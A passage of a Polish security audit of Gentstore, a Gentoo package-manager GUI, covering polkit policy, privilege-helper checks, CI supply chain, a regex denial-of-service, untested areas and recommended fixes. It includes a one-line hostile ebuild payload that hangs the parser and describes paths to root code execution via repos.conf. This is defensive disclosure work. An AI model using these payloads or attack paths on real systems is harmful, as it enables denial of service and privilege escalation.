def test_an_implausibly_large_catalogue_is_ignored(tmp_path):
    """Ten sam limit, który core/useflags.py stawia metadata.xml."""
    path = tmp_path / "repositories.xml"
    path.write_text("<repositories>" + "<repo><name>x</name></repo>" * 400_000 + "</repositories>")
    assert overlays.parse(path).entries == ()
```

---

### GS-14 · `allow_inactive = auth_admin` — sesja zdalna może uwierzytelnić

**Waga: Info**  **Pewność: potwierdzone (czytanie kodu)**
**Miejsce:** `data/org.gentoo.gentstore.policy:43,57`

Obie akcje mają `allow_any`, `allow_inactive` i `allow_active` ustawione na `auth_admin`.
`allow_inactive` obejmuje sesje nieaktywne, w tym SSH z przekierowanym X11 albo drugą, przełączoną
konsolę. Dla aplikacji, która jest graficzną nakładką uruchamianą przy biurku, `auth_admin` dla
`allow_active` i `no` dla `allow_inactive`/`allow_any` byłoby zgodne z tym, co program robi.

`Docs/04-privileges.md §3` opisuje bardzo dokładnie wybór `auth_admin` nad `auth_admin_keep`,
ale o trzech osiach `allow_*` nie mówi nic — więc to nie jest ograniczenie świadomie przyjęte,
tylko takie, o którym dokument milczy.

**Poprawka:**

```diff
     <defaults>
-      <allow_any>auth_admin</allow_any>
-      <allow_inactive>auth_admin</allow_inactive>
+      <!-- Gentstore jest oknem przy biurku. Sesja zdalna albo przełączona
+           konsola to nie miejsce, w którym ktoś patrzy na ten dialog. -->
+      <allow_any>no</allow_any>
+      <allow_inactive>no</allow_inactive>
       <allow_active>auth_admin</allow_active>
     </defaults>
```

(do rozważenia razem z użytkownikami — na maszynie zarządzanej przez SSH ta zmiana odcina
aplikację; dlatego Info, a nie Niska.)

---

### GS-15 · `_tampering_risk` nie sprawdza właściciela

**Waga: Info**  **Pewność: potwierdzone (czytanie kodu)**
**Miejsce:** `gentstore/runner/privilege.py:242-268`

W trybie `GENTSTORE_DEV_HELPER=1` `_tampering_risk` odrzuca plik zapisywalny dla grupy lub innych.
Nie pyta jednak, **kto** jest właścicielem. W checkoucie właścicielem jest użytkownik uruchamiający
aplikację — czyli dokładnie napastnik A — więc sprawdzenie nie zatrzymuje go w żadnym stopniu.
Do tego między `_tampering_risk(source)` (`:289`) a uruchomieniem `pkexec python3 <source>` mija
czas, w którym plik można podmienić.

`Docs/04-privileges.md §3` i komentarz przy `DEV_VARIABLE` opisują to ryzyko wprost („anything able
to write into the checkout… would be one authentication away from root"), więc zgodnie z §7
promptu nie zgłaszam tego jako nowego ryzyka. Zgłaszam rozbieżność w opisie: docstring
`_tampering_risk` mówi „Why *path* is not safe to run as root, or `None` when it is", co sugeruje
odpowiedź, której ta funkcja nie daje. Warto to nazwać w samym docstringu:

```diff
     Group- or world-writable anywhere from the file up to ``/`` means somebody
     other than its owner can decide what root ends up executing. A directory is
     enough: whoever can write one can replace the file inside it.
+
+    Co ta funkcja *nie* sprawdza: właściciela. W checkoucie właścicielem jest ten
+    sam użytkownik, który uruchamia aplikację, więc wobec napastnika działającego
+    jako ten użytkownik ta kontrola nie daje nic — i nie po to jest. Jest po to,
+    żeby drzewo w /tmp albo na współdzielonym dysku nie stało się drogą dla
+    *kogoś innego*. Ochrona przed właścicielem to `sudo make install-system`.
```

---

### GS-16 · Cache indeksu i katalog overlayów decydują o tożsamości pokazywanego pakietu

**Waga: Info**  **Pewność: potwierdzone (czytanie kodu)**
**Miejsce:** `gentstore/core/index_cache.py:108-193`, `gentstore/core/overlays.py:227-234`

`fingerprint()` jest liczony z publicznego stanu repozytoriów (nazwy, lokalizacje, `mtime`
katalogów), więc ten sam użytkownik może go policzyć i zapisać zatruty `search-index.json`
z dowolnym `cp`, opisem i repozytorium. To samo dotyczy `~/.cache/eselect-repo/repositories.xml`,
z którego ekran repozytoriów bierze nazwę wysyłaną potem do `eselect repository enable <name>`.

Napastnik A ma mocniejsze narzędzia (może wołać launcher wprost), więc to nie zwiększa jego
zasięgu — jest to natomiast prymitywa do **oszukania użytkownika co do tego, co zatwierdza**, i
warto, żeby dokumentacja to nazywała. Komentarz w `index_cache.py:28-38` mówi, że „the fingerprint
below is what makes that harmless"; odcisk chroni przed *nieświeżością*, nie przed *podmianą*.

**Poprawka:** nie kod, tylko uczciwy komentarz + ewentualnie weryfikacja `cp` względem Portage
przy wyborze pakietu (a nie tylko przy wyświetlaniu szczegółów).

---

### GS-17 · Brakujące testy negatywne dla reguł granicznych

**Waga: Info**  **Pewność: potwierdzone (przegląd `tests/`)**

`tests/test_helper.py` i `tests/test_runner.py` są niezwykle porządne — każda z reguł 1, 1a, 1b, 1c,
1d, 2, 7, 8 i 9 ma co najmniej jeden test negatywny, a `test_the_helper_and_the_interface_agree_on_what_is_editable`
i `test_every_launcher_template_belongs_to_a_command_the_interface_builds` pilnują dwóch kopii
w dwóch plikach. Braki są punktowe i wszystkie dotyczą znalezisk wyżej:

| Reguła | Test pozytywny | Test negatywny | Uwaga |
|---|---|---|---|
| 1a — `write_file` a treść | `test_write_file_creates_a_repository_definition` | **brak** | GS-01 |
| 1b — zestaw znaków `_MAKE_CONF_VALUE` | `test_the_assignments_gentstore_does_make_still_go_through` | **częściowy** | `test_the_helper_and_the_interface_agree_on_what_is_editable` porównuje nazwy zmiennych; sprawdziłem, że **nie** porównuje zestawu znaków ani semantyki wartości → GS-06 |
| 7 — `expect` przy `cfg_apply merge` | `test_cfg_apply_honours_an_expectation_when_it_is_given` | **brak** (jest `test_cfg_apply_without_an_expectation_still_works`, czyli test utrwalający lukę) | GS-02 |
| 9 — katalog kandydata a `_only_root_can_write` | — | **brak** (jest tylko dla korzenia) | GS-03 |
| 2a — atom z dziką kartą przy `--unmerge` | `test_the_launcher_refuses_every_package_there_is` dopuszcza `media-video/*` | **brak dla `--unmerge`** | GS-04 |
| 2a — `file://` i nazwa `gentoo` | `test_the_overlay_dialog_and_the_launcher_agree_on_url_schemes` | **brak** | GS-09 |
| „jedna linia" wobec `\r`/U+2028 | `test_a_second_line_cannot_ride_along_inside_the_first` (tylko `\n`) | **brak** | GS-10 |
| Kontrakt „zawsze jedna odpowiedź JSON" | `test_malformed_json_is_refused` | **brak dla RecursionError** | GS-12 |
| Podgląd = zapis (warstwa Qt) | — | **brak w ogóle** | GS-07, GS-08 |

Szkice wszystkich tych testów są przy odpowiednich znaleziskach.

---

### GS-18 · Łańcuch dostaw: drobiazgi w CI i w skryptach pakujących

**Waga: Info**  **Pewność: potwierdzone (czytanie kodu)**

Przejrzałem `packaging/make-overlay.sh`, `packaging/publish-overlay.sh`, ebuildy, `Manifest`,
`tools/release.py` i pięć workflowów. Ogólnie rzecz jest zrobiona ostrożnie — `website-version.yml`
ma wręcz wzorcowy komentarz o tym, dlaczego `${{ }}` idzie przez `env:`, a nie do treści `run:`.
Drobiazgi, po jednym zdaniu:

- **`release.yml:100`** — `echo "DRY=${{ github.event.inputs.dry_run || 'false' }}"` to jedyne
  miejsce, gdzie `github.event.inputs.*` trafia wprost do bloku `run:`. Wejście jest typu
  `boolean`, więc GitHub ogranicza je do `true`/`false` i luki tu nie ma — ale jest to jedyny
  wyjątek od zasady, którą sam projekt gdzie indziej zapisał; warto przenieść do `env:` dla
  spójności.
- **Akcje przypięte do tagów** (`actions/checkout@v5`, `actions/setup-python@v5`), a nie do SHA.
  Przy `permissions: contents: write` w `release.yml` i `overlay.yml` przejęcie tagu akcji daje
  zapis do repozytorium.
- **`tests.yml:63`** — `pip install --upgrade pip pytest ruff PyQt6 portage` bez przypięcia wersji.
  Przypięte.

  > **SPROSTOWANIE.** W tym samym punkcie napisałem, że warto przypiąć też
  > `gentoo/portage:latest` (`tests-gentoo.yml:39`). **To była zła rada.** Ten workflow to nocny
  > cron, którego jedynym zadaniem jest sprawdzić, czy Gentstore nadal działa wobec Gentoo *w tej
  > postaci, w jakiej jest dzisiaj*. Przypięcie do konkretnego digestu zamroziłoby dokładnie to,
  > co on obserwuje, i przechodziłby miesiącami po tym, jak odpowiedź by się zmieniła. Zostawione
  > na `:latest`, z komentarzem w pliku, żeby następny czytelnik tego nie „naprawił".
- **`packaging/make-overlay.sh`** — wariant `curl … | sudo bash`, w którym jedyną weryfikacją
  pobranej treści jest `grep -q '^EGIT_REPO_URI='` (`:122`). Skrypt sam to nazywa („A 404 page or
  a captive portal is still a 200 to the shell"), ale to sprawdzenie odpowiada na inne pytanie niż
  „czy to jest ten plik". `mktemp -d` + `trap 'rm -rf -- "${SOURCE}"' EXIT` są poprawne,
  cytowanie w całym skrypcie jest konsekwentne, `download` wymusza `--proto '=https' --tlsv1.2`.
- **`GENTSTORE_REF`** (`:51`) trafia bez filtrowania do `RAW_BASE`, a stamtąd do URL-a. `sudo`
  domyślnie czyści środowisko, więc przy `curl | sudo bash` zmienna nie przechodzi i realnego
  skutku nie ma; warto jednak ograniczyć ją do `^[A-Za-z0-9._/-]+$`, bo `main/../../<inne-repo>/…`
  byłoby poprawną ścieżką na `raw.githubusercontent.com`.
- **Ebuildy** — `exeinto /usr/libexec/gentstore` daje `0755 root:root`, `insinto` dla polityki
  polkit `0644`; `python_fix_shebang` na obu programach jest tym, czego trzeba. Ebuild `9999`
  jest live i nieprzypięty do commita, co jest normą dla live ebuildów i jest
  `KEYWORDS=""`, więc trzeba go zaakceptować ręcznie.

---

---

### GS-19 · Dwa nadliniowe wyrażenia w `core/emerge_parse.py` zawieszają okno na jedną linię z ebuilda

**Waga: Średnia**  **Pewność: potwierdzone (pomiary)**
**Miejsce:** `gentstore/core/emerge_parse.py:56` (`_ROW`), `:68` (`_SIZE`, przed poprawką)
**Napastnik i warunki wstępne:** B — autor overlaya, którego użytkownik dodał. Bez dialogu, bez
uwierzytelnienia: wystarczy, że użytkownik naciśnie „Analizuj wymagania" albo „Podgląd".

**Dopisane po oddaniu raportu**, jako uzupełnienie luki zgłoszonej w §4. Przejrzałem wszystkie 25
literałów wyrażeń w pięciu plikach. `core/required_use.py` nie ma ich wcale. **Żaden nie ma
zagnieżdżonego kwantyfikatora**, więc wykładniczego ReDoS-a tu nie ma. Dwa mają sąsiadujące,
nakładające się kwantyfikatory:

`_ROW = ^\[(?P<kind>[a-z-]+)(?P<flags>[^\]]*)\]\s+(?P<rest>.*)$` — `[^\]]` jest nadzbiorem
`[a-z-]`, więc na linii, która otwiera nawias i nigdy go nie zamyka, oba kwantyfikatory mogą
podzielić między siebie litery na tyle sposobów, ile jest liter. **Kwadratowe.**

`_SIZE = (?P<number>[\d\xa0\u202f ,.]+?)\s*(?P<unit>(?:[KMGT]i)?B)\s*$` — leniwy przebieg
cyfr i separatorów nakłada się na `\s*` obok, a `search` zaczyna całość od nowa na każdej
pozycji. **Sześcienne.**

**Scenariusz:**
1. Ebuild w dodanym overlayu ma `pkg_pretend() { printf '[%0.s' {1..200000}; }` — Portage
   uruchamia `pkg_pretend` właśnie przy `--pretend`, a ebuild może wypisać cokolwiek.
2. Użytkownik naciska „Analizuj wymagania". `install_plan.from_output()`
   (`ui/pages/search.py:881`) stosuje `parse_row()` do **każdej** linii wyjścia.
3. Okno przestaje odpowiadać.

**Dowód** (zmierzone przez prawdziwe funkcje, nie przez surowe wyrażenia):

| wejście | przed | po |
|---|---|---|
| `_ROW`, 64 tys. znaków | >6 s | 0,33 ms |
| `_ROW`, 200 tys. znaków | **128,8 s** | ~1 ms |
| `_ROW`, milion znaków | — | 5,04 ms |
| `_SIZE`, 1000 spacji w ogonie wiersza | >6 s | poniżej 1 ms |
| `_SIZE`, milion spacji | — | 10,97 ms |

Do `_SIZE` prowadzi `parse_row`: `size = parse_size(tail.rsplit('"', 1)[-1])`, więc wiersz bez
cudzysłowu oddaje tej funkcji **cały swój ogon**.

**Skutek:** zawieszenie procesu GUI. Proces jest nieuprzywilejowany, więc nic nie sięga roota —
to jest odmowa usługi dla okna, nie eskalacja. Waga Średnia, nie wyższa, właśnie dlatego.

**Poprawka:** `_ROW` dostał kwantyfikator zaborczy (`[a-z-]++`) — jeden znak, i nie jest to
zawężenie: zachłanny i tak brał najdłuższy przebieg, a wszystko, co stary wzorzec umiał dopasować
przez nawroty, `[^\]]*` dopasuje bez nich. `_SIZE` przestał być wyrażeniem: jednostka to sufiks,
więc szuka się jej przez `endswith`, a liczba to przebieg przed nią, więc znajduje się ją idąc
wstecz. Jedno przejście, bez możliwości nawrotu.

**Sprawdzenie równoważności:** stara i nowa implementacja porównane na 80 tysiącach losowych
ciągów i na wszystkich dziewięciu fixture'ach z `tests/fixtures/` — **zero rozbieżności**.

**Test regresyjny:** `test_one_line_cannot_hold_the_parser_up` w `tests/test_update.py`, z
budżetem 3 s na 200 tys. znaków. Przeciwko kodowi sprzed poprawki pada po 128,8 s.

**Podłoga pod tym wszystkim, dorobiona osobno:** `runner/command.py:_read()` zbierał bufor aż do
znaku nowej linii **bez żadnego limitu długości**, a `log_view.MAX_LINES` ogranicza liczbę linii,
nie ich rozmiar. Te dwa wzorce są teraz liniowe, ale następny dodany taki nie będzie, a linia bez
końca to również nieograniczona pamięć w procesie GUI.

Doszło `MAX_LINE = 16 KiB`, nakładane na **każdym** wyjściu z tej klasy, a nie tylko na buforze.
Linia, która przekroczy ten rozmiar, jest przekazywana dalej w kawałkach — nic nie ginie, a nic
poniżej nie dostaje ciągu bez górnego ograniczenia długości.

Pierwsza wersja tej poprawki ograniczała wyłącznie **niedokończony** bufor, a `split("\n")` oddaje
linie zakończone o dowolnej długości — więc sto megabajtów zwieńczone znakiem nowej linii
przechodziło obok limitu, pod którym miało stać. Wyłapane w przeglądzie #11.
Przy okazji domknęło to przypadek, który **nie wymaga żadnego napastnika**: `ninja`, `wget`
i każdy inny program z paskiem postępu nadpisuje jedną linię powrotami karetki i nigdy nie wysyła
znaku nowej linii, więc ten bufor rósł przez cały czas trwania budowania. Liczy się tu tylko
ostatnia klatka — to samo pokazuje terminal — i tak jest teraz obsługiwana.

Szesnaście kibibajtów to około dwudziestokrotność najdłuższej linii w logach na maszynie, na
której to pisano (715 znaków), i kilkukrotność wywołania kompilatora ze stoma ścieżkami nagłówków,
czyli najdłuższej rzeczy, jaką budowanie realnie wypisuje.

## 4. Czego nie sprawdzono

Uczciwa lista. Wolę ją dłuższą niż wrażenie kompletności.

~~**Nie uruchomiłem testów ani lintera.**~~ **Nieaktualne — patrz sprostowanie niżej.**
W chwili pisania raportu w tym środowisku nie było `pytest` ani `ruff`, więc wszystkie odwołania
do testów pochodziły z czytania plików w `tests/`, a szkice testów regresyjnych przy znaleziskach
były szkicami, nie działającym kodem.

> **SPROSTOWANIE.** Oba narzędzia zostały później zainstalowane, a każde znalezisko dostało
> działający test. Warto odnotować, co pokazał pierwszy prawdziwy przebieg: przez część pracy
> używałem własnej namiastki `pytest`, która zgłaszała **sześć** padających testów. Prawdziwy
> `pytest` pokazał **dwa** — cztery pozostałe były brakami mojego narzędzia (`monkeypatch.delattr`,
> `capsys`), nie kodu. Podawałem liczbę z własnego narzędzia jako fakt o projekcie. Te dwa
> prawdziwe okazały się brakiem skompilowanych katalogów `.qm`; dziś pomijają się z podaniem
> komendy zamiast padać, a `ruff` przechodzi czysto na całym repozytorium.

**Nie uruchomiłem `eselect`, `emerge` ani `portage`** — to wykluczał §2 promptu. Stąd trzy rzeczy
są wnioskami z dokumentacji Portage, a nie obserwacją:
- czy `eselect repository add` odmawia dla nazwy już istniejącej (GS-09b);
- czy `emake` naprawdę przepuszcza `-f` z `MAKEOPTS` w taki sposób, że wygrywa nad domyślnym
  `Makefile` pakietu (GS-06, druga połowa);
- czy `RepoConfigLoader` scala pliki `repos.conf/*` dokładnie tak, jak robi to `configparser`
  w moim PoC (GS-01). Sprawdziłem, że `configparser` scala tak, jak twierdzę; że Portage używa go
  w ten sposób, wiem z jego kodu, ale go nie uruchomiłem.

**Przejrzane pobieżnie, bez pełnego przejścia linia po linii:**
- `gentstore/ui/` poza miejscami, do których prowadził przepływ danych. Znaleziska GS-07 i GS-08
  opierają się na wyszukaniu wszystkich `QLabel`/`setToolTip` i sprawdzeniu, że `setTextFormat`
  nie pada nigdzie — ale **nie** prześledziłem każdej z ~150 etykiet do jej źródła danych. Lista
  w GS-08 to te, które sprawdziłem; jest prawie na pewno niepełna.
- ~~`core/emerge_parse.py`, `core/elog.py`, `core/news.py`, `core/required_use.py`,
  `core/depgraph_hints.py` — nie przeanalizowałem wyrażeń regularnych pod kątem ReDoS.~~
  **Uzupełnione po oddaniu raportu — patrz GS-19 niżej.** Znalazły się dwa nadliniowe wzorce,
  oba w `core/emerge_parse.py`, oba osiągalne. Naprawione.
- `core/masking.py`, `core/licenses.py`, `core/packages.py`, `core/worldset.py`,
  `core/binrepos.py`, `core/profiles.py`, `core/glsa.py` — przejrzane pod kątem tego, czy budują
  ścieżkę lub linię idącą do helpera; poza tym nie.
- `gentstore/ui/pages/*` pod kątem §5.5 — sprawdziłem siedem pozycji z tabeli `Docs §6`
  (depclean, usunięcie repo, profil, overlay spoza katalogu, przywrócenie kopii, odinstalowanie,
  maskowanie repo) i znalazłem po jednym miejscu dla każdej. **Nie** udowodniłem, że nie istnieje
  *druga* ścieżka kodu do tej samej operacji z pominięciem dialogu — do tego trzeba by przejść
  wszystkie wywołania `context.run` / `self._run` / `self._start`, czego nie zrobiłem wyczerpująco.
  Jedyny rozjazd, który znalazłem, to GS-11.
- `tools/release.py` (409 linii) — przejrzany pod kątem tego, co robi z `GH_TOKEN` i co zapisuje;
  nie linia po linii.
- `tools/screenshot.py`, `tools/readme_shots.py`, `tools/refusal-demo.sh` — zgodnie z §7 promptu
  tylko rzut oka. Nic rażącego.
- `gentstore/i18n/*.ts`, `Makefile`, `pyproject.toml` — przejrzane; `Makefile` instaluje
  `0755`/`0644` poprawnie i respektuje `DESTDIR`/`PREFIX`.

**Segfault, który wystąpił dwa razy i nie został wyjaśniony.** Zaraz po scaleniu pierwszej partii
poprawek `make check` padł z naruszeniem ochrony pamięci. Powtórzony — padł drugi raz. Potem każdy
kolejny przebieg, a było ich kilkadziesiąt, był czysty.

Sprawdziłem hipotezę, że winne są dwa testy przełączające język, które po zbudowaniu katalogów
`.qm` wreszcie zaczęły się naprawdę wykonywać zamiast padać: zbudowałem katalogi na commicie
sprzed audytu i puściłem sześć razy. Czysto. To nie to. Innej hipotezy popartej dowodem nie mam.

Crash jest w warstwie C — Python sam z siebie tego nie robi — i niemal na pewno dotyczy sprzątania
widżetów Qt, czyli tej samej klasy, którą `runner/command.py:close()` opisuje słowami *„to nie jest
błąd, który Qt może zgłosić, to jest crash”*. Zależy od kolejności, w jakiej Python zwolni obiekty,
a ta zależy od obciążenia maszyny — stąd milczenie przez kilkadziesiąt przebiegów niczego nie
dowodzi.

**Nie jest naprawiony. Przestał się pojawiać.** To dwie różne rzeczy i nie należy ich mylić.
Nie dotyczy działającej aplikacji — okno uruchomione w trakcie pracy chodziło i zamknęło się
czysto; objawia się wyłącznie w zestawie testów.

Czego brakuje, żeby to domknąć: **nazwy testu, na którym się urywa.** Przy obu wystąpieniach miałem
tylko obcięty ogon wyjścia, bez linii poprzedzającej `Fatal Python error`, i to był błąd
w prowadzeniu śledztwa — pytest sam wypisuje ślad Pythona przy takim padzie, wystarczyło go nie
zgubić. Gdyby wrócił:

```
QT_QPA_PLATFORM=offscreen python3 -m pytest -vv 2>&1 | tee /tmp/crash.log
```

i odczytać ostatnią linię przed `Fatal Python error` — będzie nią `nodeid` testu, na którym
proces zginął.

`-vv`, nie `-q`, i ta różnica jest tu całą sprawą. `-q` wypisuje kropkę **po** zakończeniu testu,
więc test, który zabija proces, nigdy swojej kropki nie dostaje; `-vv` wypisuje `nodeid` **przed**
uruchomieniem, więc ostatnia linia nazywa winowajcę. Sprawdzone na teście wołającym `os.abort()`:
przy `-q` linia przed `Fatal Python error` to `..`, przy `-vv` to
`test_crash.py::test_the_one_that_dies`.

Zwykle ratuje jeszcze `faulthandler`, który przy takim padzie wypisuje ślad Pythona — ale **nie
tutaj**: w obu zaobserwowanych wystąpieniach lista ramek Pythona była pusta, a zaraz po niej szedł
stos C. To znaczy, że crash nastąpił w kodzie C bez ramki Pythona na stosie, czyli dokładnie
w sprzątaniu Qt. Przy takim padzie `-q` nie da nazwy żadną drogą.

**Czego nie próbowałem w ogóle:**
- wyścigów (TOCTOU) *empirycznie* — rozumowanie w tabeli §2 przy regule 1 jest analizą kodu,
  nie eksperymentem z dwoma procesami;
- zachowania przy awaryjnym `sudo` z realnym `sudoers` (`env_keep`, `secure_path`) — oparłem się
  na domyślnym `env_delete`, który usuwa `PYTHON*`; na maszynie z rozluźnionym `env_keep` wnioski
  mogą być inne;
- `logging_setup.py` / `settings.py` pod kątem tego, co dokładnie trafia do logów (czy np. URL
  repozytorium z danymi uwierzytelniającymi w `sync-uri` pojawia się w
  `~/.local/state/gentstore/`). Sprawdziłem tylko, że `logging_setup.py` nie ustawia jawnie
  uprawnień plików, więc decyduje umask.

---

## 5. Pięć najważniejszych działań

1. **Sprawdzać treść, nie tylko ścieżkę, w `write_file`** (GS-01). Plik w `repos.conf/` może
   przedefiniować `sync-uri` repozytorium `gentoo`, a to jest wykonanie kodu jako root przy
   najbliższej aktualizacji. Jedna funkcja walidująca sekcję i klucze, plus limit głębokości
   w `_require_owned`.
2. **Wymagać `expect` dla `cfg_apply` z `decision="merge"`** (GS-02) i pytać
   `_only_root_can_write` o katalog, w którym plik `._cfg` naprawdę leży, a nie tylko o korzeń
   `CONFIG_PROTECT` (GS-03). To dwie linie kodu i domyka jedyną operację sięgającą poza
   `/etc/portage`.
3. **Przestać przyjmować regex z żądania w `replace_line`** (GS-05) i **ograniczyć wartości
   `FEATURES` i `MAKEOPTS`** do tokenów, które ekran ustawień faktycznie produkuje (GS-06).
   Pierwsze usuwa nieprzerywalną pętlę w procesie roota, drugie — wyłączenie sandboksa i
   `userpriv` jednym wierszem w `make.conf`.
4. **Zawęzić dwa wiersze tabeli launchera**: atom bez dzikiej karty dla `--unmerge` (GS-04),
   `file://` poza listą schematów i nazwa `gentoo` poza listą nazw dla
   `eselect repository add` (GS-09).
5. **`setTextFormat(Qt.TextFormat.PlainText)` wszędzie, gdzie do `QLabel` trafia tekst spoza
   `self.tr()`** (GS-07, GS-08). Najtańsza zmiana w całym zestawie, a przywraca zasadę, na której
   stoi cały projekt: podgląd ma pokazywać to, co zostanie zapisane. Dziś atom zaczynający się od
   `<` wyświetla się jako pusty ciąg.

---

*Przed oddaniem przeszedłem po każdym znalezisku jeszcze raz i próbowałem je obalić. Wypadły:
TOCTOU w `check_path` (zapis idzie przez `os.replace`, które nie podąża za dowiązaniem ostatniego
komponentu, a `/etc/portage` jest zapisywalne tylko dla roota); `restore` z nazwą zawierającą
ukośnik (regexy zakotwiczone); wyjście poza drzewo przy rozpakowaniu `tar.gz` (`filter="data"`);
wyciek środowiska do dziecka launchera (`env=` dostaje wyłącznie zbudowany słownik);
`LOCPATH` przy `LC_ALL` (nie jest przekazywany); przemycenie drugiej zmiennej do `make.conf`
przez cudzysłowy lub komentarz (sprawdzone PoC-em — odrzucane). Znaleziska, które przetrwały
tylko częściowo, są oznaczone przy pewności.*
